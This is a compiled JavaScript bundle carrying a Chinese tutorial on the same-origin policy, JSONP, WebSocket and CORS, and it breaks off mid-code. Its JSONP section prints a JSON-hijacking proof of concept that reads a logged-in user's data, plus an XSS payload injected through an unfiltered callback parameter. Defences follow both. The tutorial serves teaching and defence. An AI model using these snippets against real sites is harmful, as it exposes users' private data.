(window.__LOADABLE_LOADED_CHUNKS__=window.__LOADABLE_LOADED_CHUNKS__||[]).push([[20],{150:function(e,a,t){"use strict";t.r(a),t.d(a,"default",(function(){return o}));t(130),t(0);var n=t(93);function c(){return(c=Object.assign||function(e){for(var a=1;a<arguments.length;a++){var t=arguments[a];for(var n in t)Object.prototype.hasOwnProperty.call(t,n)&&(e[n]=t[n])}return e}).apply(this,arguments)}function p(e,a){if(null==e)return{};var t,n,c=function(e,a){if(null==e)return{};var t,n,c={},p=Object.keys(e);for(n=0;n<p.length;n++)t=p[n],a.indexOf(t)>=0||(c[t]=e[t]);return c}(e,a);if(Object.getOwnPropertySymbols){var p=Object.getOwnPropertySymbols(e);for(n=0;n<p.length;n++)t=p[n],a.indexOf(t)>=0||Object.prototype.propertyIsEnumerable.call(e,t)&&(c[t]=e[t])}return c}var s={},b="wrapper";function o(e){var a=e.components,t=p(e,["components"]);return Object(n.b)(b,c({},s,t,{components:a,mdxType:"MDXLayout"}),Object(n.b)("h1",{className:"__internal",id:"同源策略和域安全"},"同源策略和域安全",Object(n.b)("a",c({parentName:"h1"},{href:"#%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5%E5%92%8C%E5%9F%9F%E5%AE%89%E5%85%A8","aria-hidden":!0,className:"anchor"}),"#")),Object(n.b)("h1",{className:"__internal",id:"同源策略"},"同源策略",Object(n.b)("a",c({parentName:"h1"},{href:"#%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5","aria-hidden":!0,className:"anchor"}),"#")),Object(n.b)("p",null,"同源策略是目前所有浏览器都实行的一种安全政策。"),Object(n.b)("p",null,"A网页设置的 Cookie，B网页不能打开，除非这两个网页同源。"),Object(n.b)("p",null,"所谓同源，是指："),Object(n.b)("p",null,Object(n.b)("strong",{parentName:"p"},"两个网页，协议(protocol)、端口(port)、和主机(host)都相同.")),Object(n.b)("p",null,"如果非同源，以下三种行为受到限制："),Object(n.b)("blockquote",null,Object(n.b)("p",{parentName:"blockquote"},"（1） Cookie、",Object(n.b)("inlineCode",{parentName:"p"},"LocalStorage")," 和 ",Object(n.b)("inlineCode",{parentName:"p"},"IndexDB")," 无法读取。"),Object(n.b)("p",{parentName:"blockquote"},"（2） DOM 无法获得。"),Object(n.b)("p",{parentName:"blockquote"},"（3） AJAX 请求不能发送。")),Object(n.b)("p",null,Object(n.b)("strong",{parentName:"p"},"同源策略，哪些东西是同源可以获取到的？")),Object(n.b)("blockquote",null,Object(n.b)("p",{parentName:"blockquote"},"cookie： 服务器写入浏览器的一小段信息，只有同源的网页才能共享"),Object(n.b)("p",{parentName:"blockquote"},"DOM： \t如果两个网页不同源，就无法拿到对方的DOM ； 典型的例子是",Object(n.b)("inlineCode",{parentName:"p"},"iframe"),"窗口和",Object(n.b)("inlineCode",{parentName:"p"},"window.open"),"方法打开的窗口，它们与父窗口无法通信 ")),Object(n.b)("p",null,Object(n.b)("strong",{parentName:"p"},"如果子域名和顶级域名不同源，在哪里可以设置叫他们同源？")),Object(n.b)("p",null,"两个网页一级域名相同，只是二级域名不同，浏览器允许通过设置",Object(n.b)("inlineCode",{parentName:"p"},"document.domain"),"属性共享 Cookie，拿到DOM等。"),Object(n.b)("p",null,"在根域范围内，可以 把domain属性的值设置为它的上一级域 ；"),Object(n.b)("div",{className:"rcpress-highlight","data-language":"js"},Object(n.b)("pre",c({parentName:"div"},{className:"language-js"}),Object(n.b)("code",c({parentName:"pre"},{className:"language-js"}),Object(n.b)("span",c({parentName:"code"},{className:"token comment"}),"// 对于文档 www.example.com/good.html,"),"\ndocument",Object(n.b)("span",c({parentName:"code"},{className:"token punctuation"}),"."),"domain ",Object(n.b)("span",c({parentName:"code"},{className:"token operator"}),"=")," ",Object(n.b)("span",c({parentName:"code"},{className:"token string"}),'"example.com"'),Object(n.b)("span",c({parentName:"code"},{className:"token punctuation"}),";"),"\n",Object(n.b)("span",c({parentName:"code"},{className:"token keyword"}),"var")," domain ",Object(n.b)("span",c({parentName:"code"},{className:"token operator"}),"=")," document",Object(n.b)("span",c({parentName:"code"},{className:"token punctuation"}),"."),"domain",Object(n.b)("span",c({parentName:"code"},{className:"token punctuation"}),";"),"\n",Object(n.b)("span",c({parentName:"code"},{className:"token comment"}),"//上边的写法是正确的"),"\n",Object(n.b)("span",c({parentName:"code"},{className:"token comment"}),'//但不能设置为 "example.com" 或者"example.org"')))),Object(n.b)("p",null,Object(n.b)("strong",{parentName:"p"},"Ajax是否遵循同源策略？")),Object(n.b)("p",null,"同源政策规定，AJAX请求只能发给同源的网址，否则就报错 "),Object(n.b)("p",null,Object(n.b)("strong",{parentName:"p"},"不同浏览器之间，安全策略有哪些不同？比如chrome，firefox，IE")),Object(n.b)("p",null,"当涉及到同源策略时，Internet Explorer 有两个主要的不同点"),Object(n.b)("ul",null,Object(n.b)("li",c({parentName:"ul"},{className:"__internal"}),Object(n.b)("strong",{parentName:"li"},"授信范围"),"（Trust Zones）：两个相互之间高度互信的域名，如公司域名（corporate domains），不遵守同源策略的限制。"),Object(n.b)("li",c({parentName:"ul"},{className:"__internal"}),Object(n.b)("strong",{parentName:"li"},"端口"),"：IE 未将端口号加入到同源策略的组成部分之中，"),Object(n.b)("li",c({parentName:"ul"},{className:"__internal"}),"因此 ",Object(n.b)("inlineCode",{parentName:"li"},"http://company.com:81/index.html")," 和 ",Object(n.b)("inlineCode",{parentName:"li"},"http://company.com/index.html"),"  属于同源并且不受任何限制")),Object(n.b)("p",null,Object(n.b)("strong",{parentName:"p"},"如何设置可以跨域请求数据？jsonp是做什么的？")),Object(n.b)("h1",{className:"__internal",id:"如何规避同源策略？"},"如何规避同源策略？",Object(n.b)("a",c({parentName:"h1"},{href:"#%E5%A6%82%E4%BD%95%E8%A7%84%E9%81%BF%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5%EF%BC%9F","aria-hidden":!0,className:"anchor"}),"#")),Object(n.b)("blockquote",null,Object(n.b)("ul",{parentName:"blockquote"},Object(n.b)("li",c({parentName:"ul"},{className:"__internal"}),"以下三种方法可以规避同源策略的限制"),Object(n.b)("li",c({parentName:"ul"},{className:"__internal"}),"JSONP"),Object(n.b)("li",c({parentName:"ul"},{className:"__internal"}),"CORS"),Object(n.b)("li",c({parentName:"ul"},{className:"__internal"}),"WebSocket"))),Object(n.b)("h2",{className:"__internal",id:"jsonp"},"JSONP",Object(n.b)("a",c({parentName:"h2"},{href:"#jsonp","aria-hidden":!0,className:"anchor"}),"#")),Object(n.b)("p",null,Object(n.b)("inlineCode",{parentName:"p"},"JSONP"),"是服务器与客户端跨源通信的常用方法 "),Object(n.b)("p",null,Object(n.b)("inlineCode",{parentName:"p"},"JSON with Padding"),"，填充式",Object(n.b)("inlineCode",{parentName:"p"},"JSON"),"或者说是参数式",Object(n.b)("inlineCode",{parentName:"p"},"JSON")),Object(n.b)("p",null,Object(n.b)("inlineCode",{parentName:"p"},"JSONP"),"原理就是动态插入带有",Object(n.b)("inlineCode",{parentName:"p"},"跨域url"),"的",Object(n.b)("inlineCode",{parentName:"p"},"<script>"),"标签，然后调用回调函数"),Object(n.b)("p",null," ",Object(n.b)("strong",{parentName:"p"},"基本语法如下"),"："),Object(n.b)("div",{className:"rcpress-highlight","data-language":"json"},Object(n.b)("pre",c({parentName:"div"},{className:"language-json"}),Object(n.b)("code",c({parentName:"pre"},{className:"language-json"}),"callback(",Object(n.b)("span",c({parentName:"code"},{className:"token punctuation"}),"{")," ",Object(n.b)("span",c({parentName:"code"},{className:"token property"}),'"name"'),Object(n.b)("span",c({parentName:"code"},{className:"token operator"}),":")," ",Object(n.b)("span",c({parentName:"code"},{className:"token string"}),'"wintrysec"')," ",Object(n.b)("span",c({parentName:"code"},{className:"token punctuation"}),",")," ",Object(n.b)("span",c({parentName:"code"},{className:"token property"}),'"msg"'),Object(n.b)("span",c({parentName:"code"},{className:"token operator"}),":")," ",Object(n.b)("span",c({parentName:"code"},{className:"token string"}),'"获取成功"')," ",Object(n.b)("span",c({parentName:"code"},{className:"token punctuation"}),"}"),");"))),Object(n.b)("p",null,Object(n.b)("strong",{parentName:"p"},Object(n.b)("inlineCode",{parentName:"strong"},"JSONP"),"两部分组成：回调函数和里面的数据。"),"\n回调函数是当响应到来时，应该在页面中调用的函数，一般是在发送过去的请求中指定 "),Object(n.b)("p",null," 向服务器请求",Object(n.b)("inlineCode",{parentName:"p"},"JSON"),"数据，这种做法不受同源政策限制；服务器收到请求后，将数据放在一个指定名字的回调函数里传回来 "),Object(n.b)("div",{className:"rcpress-highlight","data-language":"javascript"},Object(n.b)("pre",c({parentName:"div"},{className:"language-javascript"}),Object(n.b)("code",c({parentName:"pre"},{className:"language-javascript"}),Object(n.b)("span",c({parentName:"code"},{className:"token keyword"}),"function")," ",Object(n.b)("span",c({parentName:"code"},{className:"token function"}),"addScriptTag"),Object(n.b)("span",c({parentName:"code"},{className:"token punctuation"}),"("),Object(n.b)("span",c({parentName:"code"},{className:"token parameter"}),"src"),Object(n.b)("span",c({parentName:"code"},{className:"token punctuation"}),")")," ",Object(n.b)("span",c({parentName:"code"},{className:"token punctuation"}),"{"),"\n  ",Object(n.b)("span",c({parentName:"code"},{className:"token keyword"}),"var")," script ",Object(n.b)("span",c({parentName:"code"},{className:"token operator"}),"=")," document",Object(n.b)("span",c({parentName:"code"},{className:"token punctuation"}),"."),Object(n.b)("span",c({parentName:"code"},{className:"token function"}),"createElement"),Object(n.b)("span",c({parentName:"code"},{className:"token punctuation"}),"("),Object(n.b)("span",c({parentName:"code"},{className:"token string"}),"'script'"),Object(n.b)("span",c({parentName:"code"},{className:"token punctuation"}),")"),Object(n.b)("span",c({parentName:"code"},{className:"token punctuation"}),";"),"\n  script",Object(n.b)("span",c({parentName:"code"},{className:"token punctuation"}),"."),Object(n.b)("span",c({parentName:"code"},{className:"token function"}),"setAttribute"),Object(n.b)("span",c({parentName:"code"},{className:"token punctuation"}),"("),Object(n.b)("span",c({parentName:"code"},{className:"token string"}),'"type"'),Object(n.b)("span",c({parentName:"code"},{className:"token punctuation"}),","),Object(n.b)("span",c({parentName:"code"},{className:"token string"}),'"text/javascript"'),Object(n.b)("span",c({parentName:"code"},{className:"token punctuation"}),")"),Object(n.b)("span",c({parentName:"code"},{className:"token punctuation"}),";"),"\n  script",Object(n.b)("span",c({parentName:"code"},{className:"token punctuation"}),"."),"src ",Object(n.b)("span",c({parentName:"code"},{className:"token operator"}),"=")," src",Object(n.b)("span",c({parentName:"code"},{className:"token punctuation"}),";"),"\n  document",Object(n.b)("span",c({parentName:"code"},{className:"token punctuation"}),"."),"body",Object(n.b)("span",c({parentName:"code"},{className:"token punctuation"}),"."),Object(n.b)("span",c({parentName:"code"},{className:"token function"}),"appendChild"),Object(n.b)("span",c({parentName:"code"},{className:"token punctuation"}),"("),"script",Object(n.b)("span",c({parentName:"code"},{className:"token punctuation"}),")"),Object(n.b)("span",c({parentName:"code"},{className:"token punctuation"}),";"),"\n",Object(n.b)("span",c({parentName:"code"},{className:"token punctuation"}),"}"),"\n\nwindow",Object(n.b)("span",c({parentName:"code"},{className:"token punctuation"}),"."),Object(n.b)("span",c({parentName:"code"},{className:"token function-variable function"}),"onload")," ",Object(n.b)("span",c({parentName:"code"},{className:"token operator"}),"=")," ",Object(n.b)("span",c({parentName:"code"},{className:"token keyword"}),"function")," ",Object(n.b)("span",c({parentName:"code"},{className:"token punctuation"}),"("),Object(n.b)("span",c({parentName:"code"},{className:"token punctuation"}),")")," ",Object(n.b)("span",c({parentName:"code"},{className:"token punctuation"}),"{"),"\n  ",Object(n.b)("span",c({parentName:"code"},{className:"token function"}),"addScriptTag"),Object(n.b)("span",c({parentName:"code"},{className:"token punctuation"}),"("),Object(n.b)("span",c({parentName:"code"},{className:"token string"}),"'http://example.com/ip?callback=foo'"),Object(n.b)("span",c({parentName:"code"},{className:"token punctuation"}),")"),Object(n.b)("span",c({parentName:"code"},{className:"token punctuation"}),";"),"\n",Object(n.b)("span",c({parentName:"code"},{className:"token punctuation"}),"}"),"\n\n",Object(n.b)("span",c({parentName:"code"},{className:"token keyword"}),"function")," ",Object(n.b)("span",c({parentName:"code"},{className:"token function"}),"foo"),Object(n.b)("span",c({parentName:"code"},{className:"token punctuation"}),"("),Object(n.b)("span",c({parentName:"code"},{className:"token parameter"}),"data"),Object(n.b)("span",c({parentName:"code"},{className:"token punctuation"}),")")," ",Object(n.b)("span",c({parentName:"code"},{className:"token punctuation"}),"{"),"\n  console",Object(n.b)("span",c({parentName:"code"},{className:"token punctuation"}),"."),Object(n.b)("span",c({parentName:"code"},{className:"token function"}),"log"),Object(n.b)("span",c({parentName:"code"},{className:"token punctuation"}),"("),Object(n.b)("span",c({parentName:"code"},{className:"token string"}),"'Your public IP address is: '")," ",Object(n.b)("span",c({parentName:"code"},{className:"token operator"}),"+")," data",Object(n.b)("span",c({parentName:"code"},{className:"token punctuation"}),"."),"ip",Object(n.b)("span",c({parentName:"code"},{className:"token punctuation"}),")"),Object(n.b)("span",c({parentName:"code"},{className:"token punctuation"}),";"),"\n",Object(n.b)("span",c({parentName:"code"},{className:"token punctuation"}),"}"),Object(n.b)("span",c({parentName:"code"},{className:"token punctuation"}),";"),"\n",Object(n.b)("span",c({parentName:"code"},{className:"token comment"}),"//该请求的查询字符串有一个callback参数，用来指定回调函数的名字，这对于JSONP是必需的")))),Object(n.b)("p",null,"服务器收到这个请求以后，会将数据放在回调函数的参数位置返回 "),Object(n.b)("div",{className:"rcpress-highlight","data-language":"javascript"},Object(n.b)("pre",c({parentName:"div"},{className:"language-javascript"}),Object(n.b)("code",c({parentName:"pre"},{className:"language-javascript"}),Object(n.b)("span",c({parentName:"code"},{className:"token function"}),"foo"),Object(n.b)("span",c({parentName:"code"},{className:"token punctuation"}),"("),Object(n.b)("span",c({parentName:"code"},{className:"token punctuation"}),"{"),"\n  ",Object(n.b)("span",c({parentName:"code"},{className:"token string"}),'"ip"'),Object(n.b)("span",c({parentName:"code"},{className:"token punctuation"}),":")," ",Object(n.b)("span",c({parentName:"code"},{className:"token string"}),'"8.8.8.8"'),"\n",Object(n.b)("span",c({parentName:"code"},{className:"token punctuation"}),"}"),Object(n.b)("span",c({parentName:"code"},{className:"token punctuation"}),")"),Object(n.b)("span",c({parentName:"code"},{className:"token punctuation"}),";")))),Object(n.b)("p",null,"由于",Object(n.b)("inlineCode",{parentName:"p"},"<script>"),"元素请求的脚本，直接作为代码运行。"),Object(n.b)("p",null,"这时，只要浏览器定义了",Object(n.b)("inlineCode",{parentName:"p"},"foo"),"函数，该函数就会立即调用。"),Object(n.b)("p",null,"作为参数的",Object(n.b)("inlineCode",{parentName:"p"},"JSON"),"数据被视为JavaScript对象，而不是字符串，因此避免了使用",Object(n.b)("inlineCode",{parentName:"p"},"JSON.parse"),"的步骤 "),Object(n.b)("h3",{className:"__internal",id:"jsonp的劫持"},"JSONP的劫持",Object(n.b)("a",c({parentName:"h3"},{href:"#jsonp%E7%9A%84%E5%8A%AB%E6%8C%81","aria-hidden":!0,className:"anchor"}),"#")),Object(n.b)("p",null," ",Object(n.b)("inlineCode",{parentName:"p"},"JSON")," 劫持又为 ",Object(n.b)("inlineCode",{parentName:"p"},"JSON Hijacking")," ，这个问题属于 ",Object(n.b)("inlineCode",{parentName:"p"},"CSRF")," 攻击范畴。\n当某网站通过 ",Object(n.b)("inlineCode",{parentName:"p"},"JSONP")," 的方式来跨域（一般为子域）传递用户认证后的敏感信息时\n攻击者可以构造恶意的 ",Object(n.b)("inlineCode",{parentName:"p"},"JSONP")," 调用页面，诱导被攻击者访问，来达到截取用户敏感信息的目的"),Object(n.b)("p",null," 一个典型的 ",Object(n.b)("inlineCode",{parentName:"p"},"JSON Hijacking")," 攻击代码(",Object(n.b)("inlineCode",{parentName:"p"},"wooyun"),")："),Object(n.b)("div",{className:"rcpress-highlight","data-language":"javascript"},Object(n.b)("pre",c({parentName:"div"},{className:"language-javascript"}),Object(n.b)("code",c({parentName:"pre"},{className:"language-javascript"})," ",Object(n.b)("span",c({parentName:"code"},{className:"token operator"}),"<"),"script",Object(n.b)("span",c({parentName:"code"},{className:"token operator"}),">"),"\n ",Object(n.b)("span",c({parentName:"code"},{className:"token keyword"}),"function")," ",Object(n.b)("span",c({parentName:"code"},{className:"token function"}),"wooyun"),Object(n.b)("span",c({parentName:"code"},{className:"token punctuation"}),"("),Object(n.b)("span",c({parentName:"code"},{className:"token parameter"}),"v"),Object(n.b)("span",c({parentName:"code"},{className:"token punctuation"}),")"),Object(n.b)("span",c({parentName:"code"},{className:"token punctuation"}),"{"),"\n   ",Object(n.b)("span",c({parentName:"code"},{className:"token function"}),"alert"),Object(n.b)("span",c({parentName:"code"},{className:"token punctuation"}),"("),"v",Object(n.b)("span",c({parentName:"code"},{className:"token punctuation"}),"."),"username",Object(n.b)("span",c({parentName:"code"},{className:"token punctuation"}),")"),Object(n.b)("span",c({parentName:"code"},{className:"token punctuation"}),";"),"\n ",Object(n.b)("span",c({parentName:"code"},{className:"token punctuation"}),"}"),"\n ",Object(n.b)("span",c({parentName:"code"},{className:"token operator"}),"<"),Object(n.b)("span",c({parentName:"code"},{className:"token operator"}),"/"),"script",Object(n.b)("span",c({parentName:"code"},{className:"token operator"}),">"),"\n ",Object(n.b)("span",c({parentName:"code"},{className:"token operator"}),"<"),"script src",Object(n.b)("span",c({parentName:"code"},{className:"token operator"}),"="),Object(n.b)("span",c({parentName:"code"},{className:"token string"}),'"http:/xx.cn/?o=sso&m=info&func=wooyun"'),Object(n.b)("span",c({parentName:"code"},{className:"token operator"}),">"),Object(n.b)("span",c({parentName:"code"},{className:"token operator"}),"<"),Object(n.b)("span",c({parentName:"code"},{className:"token operator"}),"/"),"script",Object(n.b)("span",c({parentName:"code"},{className:"token operator"}),">")))),Object(n.b)("p",null,"当被攻击者在登陆 360 网站的情况下访问了该网页时，那么用户的隐私数据（如用户名，邮箱等）可能被攻击者劫持"),Object(n.b)("h3",{className:"__internal",id:"jsonp防御"},"JSONP防御",Object(n.b)("a",c({parentName:"h3"},{href:"#jsonp%E9%98%B2%E5%BE%A1","aria-hidden":!0,className:"anchor"}),"#")),Object(n.b)("p",null,Object(n.b)("strong",{parentName:"p"},"1. 验证 ",Object(n.b)("inlineCode",{parentName:"strong"},"JSON")," 文件调用的来源 ",Object(n.b)("inlineCode",{parentName:"strong"},"Referer"))," "),Object(n.b)("div",{className:"rcpress-highlight","data-language":"javascript"},Object(n.b)("pre",c({parentName:"div"},{className:"language-javascript"}),Object(n.b)("code",c({parentName:"pre"},{className:"language-javascript"})," ",Object(n.b)("span",c({parentName:"code"},{className:"token operator"}),"<"),"script",Object(n.b)("span",c({parentName:"code"},{className:"token operator"}),">")," 远程加载 ",Object(n.b)("span",c({parentName:"code"},{className:"token constant"}),"JSON")," 文件时会发送 Referer \n 在网站输出 ",Object(n.b)("span",c({parentName:"code"},{className:"token constant"}),"JSON")," 数据时判断 Referer 是不是白名单合法的，就可以进行防御"))),Object(n.b)("p",null,Object(n.b)("strong",{parentName:"p"},"2.随机 token")),Object(n.b)("p",null,"存在reference伪造(qq.com.evil.com)、空reference、暴力穷举等问题"),Object(n.b)("p",null,Object(n.b)("a",c({parentName:"p"},{href:"https://www.cnblogs.com/subsir/articles/2574670.html",target:"_blank"}),"强大的PHP伪造IP头、Cookies、Reference")),Object(n.b)("p",null,"最有效的方式还是 综合防御(判断reference和添加随机字串)，或使用加在",Object(n.b)("inlineCode",{parentName:"p"},"url"),"中的token可以完美解决\n但是只要在该网站上出现一个 ",Object(n.b)("inlineCode",{parentName:"p"},"XSS")," 漏洞，那么利用这个 ",Object(n.b)("inlineCode",{parentName:"p"},"XSS")," 漏洞可能让你的防御体系瞬间崩溃"),Object(n.b)("p",null,Object(n.b)("strong",{parentName:"p"},"3.",Object(n.b)("inlineCode",{parentName:"strong"},"callback"),"函数可定义的安全问题"),"\ncallback函数的名称可以自定义，而输出环境又是",Object(n.b)("inlineCode",{parentName:"p"},"js"),"环境，如果没有严格过滤或审查，可以引起很多其他的攻击方式。"),Object(n.b)("p",null,"比如后台使用",Object(n.b)("inlineCode",{parentName:"p"},"$callback = $_GET['callback'];print $callback.(data);"),"\n这样子，认为callback是可信的，而攻击者完全可以将",Object(n.b)("inlineCode",{parentName:"p"},"alert(/xss/)"),"作为callback参数传递进去。"),Object(n.b)("p",null,Object(n.b)("strong",{parentName:"p"},"这种问题有两种解决方案：")),Object(n.b)("p",null,Object(n.b)("strong",{parentName:"p"},"(1) 严格定义 ",Object(n.b)("inlineCode",{parentName:"strong"},"Content-Type: application / json")),"\n这样的防御机制导致了浏览器不解析恶意插入的 ",Object(n.b)("inlineCode",{parentName:"p"},"XSS")," 代码"),Object(n.b)("p",null,Object(n.b)("strong",{parentName:"p"},"(2 )过滤 callback 以及 ",Object(n.b)("inlineCode",{parentName:"strong"},"JSON")," 数据输出"),"\n这样的防御机制是比较传统的攻防思维，对输出点进行 ",Object(n.b)("inlineCode",{parentName:"p"},"xss")," 过滤 "),Object(n.b)("h2",{className:"__internal",id:"websocket"},"WebSocket",Object(n.b)("a",c({parentName:"h2"},{href:"#websocket","aria-hidden":!0,className:"anchor"}),"#")),Object(n.b)("p",null,Object(n.b)("inlineCode",{parentName:"p"},"WebSocket"),"是一种通信协议，使用",Object(n.b)("inlineCode",{parentName:"p"},"ws://"),"（非加密）和",Object(n.b)("inlineCode",{parentName:"p"},"wss://"),"（加密）作为协议前缀。"),Object(n.b)("p",null,"该协议不实行同源政策，只要服务器支持，就可以通过它进行跨源通信。 "),Object(n.b)("p",null,Object(n.b)("strong",{parentName:"p"},"为什么？")),Object(n.b)("p",null,Object(n.b)("inlineCode",{parentName:"p"},"WebSocket"),"请求的头信息中有一个字段是",Object(n.b)("inlineCode",{parentName:"p"},"Origin"),"，表示该请求的请求源（origin），即发自哪个域名。"),Object(n.b)("p",null,"正是因为有了",Object(n.b)("inlineCode",{parentName:"p"},"Origin"),"这个字段，所以",Object(n.b)("inlineCode",{parentName:"p"},"WebSocket"),"才没有实行同源政策。"),Object(n.b)("p",null,"因为服务器可以根据这个字段，判断是否许可本次通信。 "),Object(n.b)("h2",{className:"__internal",id:"cors重点"},"CORS(重点)",Object(n.b)("a",c({parentName:"h2"},{href:"#cors%E9%87%8D%E7%82%B9","aria-hidden":!0,className:"anchor"}),"#")),Object(n.b)("p",null,Object(n.b)("inlineCode",{parentName:"p"},"CORS"),"是跨域资源共享（Cross-Origin Resource Sharing）的缩写。"),Object(n.b)("p",null,"它允许浏览器向跨源服务器，发出",Object(n.b)("a",c({parentName:"p"},{href:"http://www.ruanyifeng.com/blog/2012/09/xmlhttprequest_level_2.html",target:"_blank"}),Object(n.b)("inlineCode",{parentName:"a"},"XMLHttpRequest")),"请求，从而克服了AJAX只能",Object(n.b)("a",c({parentName:"p"},{href:"http://www.ruanyifeng.com/blog/2016/04/same-origin-policy.html",target:"_blank"}),"同源"),"使用的限制 "),Object(n.b)("p",null,"它是",Object(n.b)("inlineCode",{parentName:"p"},"W3C"),"标准，是跨源AJAX请求的根本解决方法。"),Object(n.b)("p",null,Object(n.b)("inlineCode",{parentName:"p"},"CORS"),"请求大致和",Object(n.b)("inlineCode",{parentName:"p"},"ajax"),"请求类似，但是在HTTP头信息中加上了Origin字段表明请求来自哪个源。"),Object(n.b)("p",null,"如果",Object(n.b)("inlineCode",{parentName:"p"},"orgin"),"是许可范围之内的话，服务器返回的响应会多出",Object(n.b)("inlineCode",{parentName:"p"},"Access-Control-Allow-*"),"的字段"),Object(n.b)("h3",{className:"__internal",id:"简单请求"},"简单请求",Object(n.b)("a",c({parentName:"h3"},{href:"#%E7%AE%80%E5%8D%95%E8%AF%B7%E6%B1%82","aria-hidden":!0,className:"anchor"}),"#")),Object(n.b)("p",null,"只要同时满足以下两大条件，就属于简单请求。\n",Object(n.b)("strong",{parentName:"p"},"(1) 请求方法是以下三种方法之一")),Object(n.b)("blockquote",null,Object(n.b)("p",{parentName:"blockquote"},"HEAD"),Object(n.b)("p",{parentName:"blockquote"},"GET"),Object(n.b)("p",{parentName:"blockquote"},"POST")),Object(n.b)("p",null,Object(n.b)("strong",{parentName:"p"},"(2) HTTP的头信息不超出以下几种字段：")),Object(n.b)("blockquote",null,Object(n.b)("p",{parentName:"blockquote"},"Accept"),Object(n.b)("p",{parentName:"blockquote"},"Accept-Language"),Object(n.b)("p",{parentName:"blockquote"},"Content-Language"),Object(n.b)("p",{parentName:"blockquote"},"Last-Event-ID"),Object(n.b)("p",{parentName:"blockquote"},"Content-Type：只限于三个值 ",Object(n.b)("inlineCode",{parentName:"p"},"application/x-www-form-urlencoded"),"、",Object(n.b)("inlineCode",{parentName:"p"},"multipart/form-data"),"、",Object(n.b)("inlineCode",{parentName:"p"},"text/plain")," ")),Object(n.b)("p",null,"浏览器发现这次跨源AJAX请求是简单请求，就自动在头信息之中，添加一个Origin字段"),Object(n.b)("div",{className:"rcpress-highlight","data-language":"http"},Object(n.b)("pre",c({parentName:"div"},{className:"language-http"}),Object(n.b)("code",c({parentName:"pre"},{className:"language-http"}),Object(n.b)("span",c({parentName:"code"},{className:"token request-line"}),Object(n.b)("span",c({parentName:"span"},{className:"token property"}),"GET")," /cors HTTP/1.1"),"\n",Object(n.b)("span",c({parentName:"code"},{className:"token header-name keyword"}),"Origin:")," http://api.b.com\n",Object(n.b)("span",c({parentName:"code"},{className:"token header-name keyword"}),"Host:")," api.a.com\n\nOrigin字段用来说明，本次请求来自哪个源（协议 + 域名 + 端口）\n服务器根据这个值，决定是否同意这次请求"))),Object(n.b)("p",null,"简单请求有三个重要的响应头"),Object(n.b)("p",null,Object(n.b)("strong",{parentName:"p"},"(1) Access-Control-Allow-Origin")),Object(n.b)("p",null,"该字段是必须的,它的值要么是请求时Origin字段的值，要么是一个*，表示接受任意域名的请求"),Object(n.b)("p",null,Object(n.b)("strong",{parentName:"p"},"(2)Access-Control-Allow-Credentials")),Object(n.b)("p",null,"该字段可选,它的值是一个布尔值，表示是否允许发送Cookie。"),Object(n.b)("p",null,"默认情况下，Cookie不包括在",Object(n.b)("inlineCode",{parentName:"p"},"CORS"),"请求之中。"),Object(n.b)("p",null,"设为true，即表示服务器明确许可，Cookie可以包含在请求中，一起发给服务器。"),Object(n.b)("p",null,"这个值也只能设为true，如果服务器不要浏览器发送Cookie，删除该字段即可"),Object(n.b)("p",null,Object(n.b)("strong",{parentName:"p"},"(3) Access-Control-Expose-Headers")),Object(n.b)("p",null,"该字段可选，",Object(n.b)("inlineCode",{parentName:"p"},"CORS"),"请求时，",Object(n.b)("inlineCode",{parentName:"p"},"XMLHttpRequest"),"对象的",Object(n.b)("inlineCode",{parentName:"p"},"getResponseHeader()"),"方法只能拿到6个基本字段："),Object(n.b)("p",null,Object(n.b)("inlineCode",{parentName:"p"},"Cache-Control、Content-Language、Content-Type、Expires、Last-Modified、Pragma"),"。"),Object(n.b)("p",null,"如果想拿到其他字段，就必须在Access-Control-Expose-Headers里面指定。"),Object(n.b)("p",null,"例如，",Object(n.b)("inlineCode",{parentName:"p"},"getResponseHeader('wintrysec')"),"可以返回",Object(n.b)("inlineCode",{parentName:"p"},"wintrysec"),"字段的值"),Object(n.b)("p",null,Object(n.b)("strong",{parentName:"p"},"响应字段，可请求资源范围")),Object(n.b)("div",{className:"rcpress-highlight","data-language":"http"},Object(n.b)("pre",c({parentName:"div"},{className:"language-http"}),Object(n.b)("code",c({parentName:"pre"},{className:"language-http"}),"Access-Control-Allow-Origin：*  //表示同意任意跨源请求"))),Object(n.b)("h3",{className:"__internal",id:"非简单请求"},"非简单请求",Object(n.b)("a",c({parentName:"h3"},{href:"#%E9%9D%9E%E7%AE%80%E5%8D%95%E8%AF%B7%E6%B1%82","aria-hidden":!0,className:"anchor"}),"#")),Object(n.b)("blockquote",null,Object(n.b)("p",{parentName:"blockquote"},"即对服务器有特殊要求的请求，比如PUT方法，自定义HTTP-HEAD头部等"),Object(n.b)("p",{parentName:"blockquote"},'非简单请求的CORS请求，会在正式通信之前，增加一次HTTP查询请求，称为"预检"请求'),Object(n.b)("p",{parentName:"blockquote"},'"预检"请求用OPTIONS方法询问服务器允许的方法 ')),Object(n.b)("p",null,' "预检"请求的头信息包括两个特殊字段。\n',Object(n.b)("strong",{parentName:"p"},"(1)Access-Control-Request-Method"),"\n该字段是必须的，用来列出浏览器的CORS请求会用到哪些HTTP方法.\n",Object(n.b)("strong",{parentName:"p"},"(2)Access-Control-Request-Headers"),"\n指定浏览器",Object(n.b)("inlineCode",{parentName:"p"},"CORS"),"请求会额外发送的",Object(n.b)("inlineCode",{parentName:"p"},"http"),"头部信息字段，多个字段用逗号分隔 "),Object(n.b)("p",null,'如果浏览器否定了"预检"请求，会返回一个正常的HTTP回应，但是没有任何',Object(n.b)("inlineCode",{parentName:"p"},"CORS"),"相关的头信息字段响应"),Object(n.b)("p",null,"服务器响应的其他",Object(n.b)("inlineCode",{parentName:"p"},"CORS"),"相关字段如下："),Object(n.b)("div",{className:"rcpress-highlight","data-language":"http"},Object(n.b)("pre",c({parentName:"div"},{className:"language-http"}),Object(n.b)("code",c({parentName:"pre"},{className:"language-http"}),Object(n.b)("span",c({parentName:"code"},{className:"token header-name keyword"}),"Access-Control-Allow-Methods:")," GET, POST, PUT\t\t//服务器支持的所有跨域请求的方法\n",Object(n.b)("span",c({parentName:"code"},{className:"token header-name keyword"}),"Access-Control-Allow-Headers:")," X-Custom-Header\t\t//服务器支持的所有头信息字段\n",Object(n.b)("span",c({parentName:"code"},{className:"token header-name keyword"}),"Access-Control-Allow-Credentials:")," true\t\t\t\t//表示是否允许发送Cookie\n",Object(n.b)("span",c({parentName:"code"},{className:"token header-name 